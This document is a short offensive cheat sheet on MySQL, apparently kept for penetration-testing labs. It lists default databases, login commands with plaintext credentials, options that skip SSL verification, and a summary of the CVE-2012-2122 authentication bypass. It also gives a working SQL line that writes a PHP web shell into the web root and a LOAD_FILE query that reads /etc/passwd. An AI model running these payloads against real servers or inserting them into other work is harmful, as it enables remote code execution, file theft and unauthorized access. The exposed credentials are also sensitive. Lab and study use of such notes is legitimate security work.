# Default databases;
mysql,sys,information_schema,performance_schema 

# Interal login and execute commands
under phpmyadmin
```
.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "show databases;"
```
# Config 
/etc/mysql/mysql.conf.d/mysqld.cnf

# ssl connect
mysql -h 10.129.1.14 -u robin -probin --skip-ssl-verify-server-cert  
mysql -h 10.129.1.14 -u robin -probin --skip-ssl

# CVE-2012-2122
Impacted Version:  
Oracle MySQL 5.1.x before 5.1.63, 5.5.x before 5.5.24, and 5.6.x before 5.6.6, and MariaDB 5.1.x before 5.1.62, 5.2.x before 5.2.12, 5.3.x before 5.3.6, and 5.5.x before 5.5.23

>allows remote attackers to bypass authentication by repeatedly authenticating with the same incorrect password, which eventually causes a token comparison to succeed due to an improperly-checked return value

### Write local file to rce
```
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```
### read local file
```
select LOAD_FILE("/etc/passwd");
```
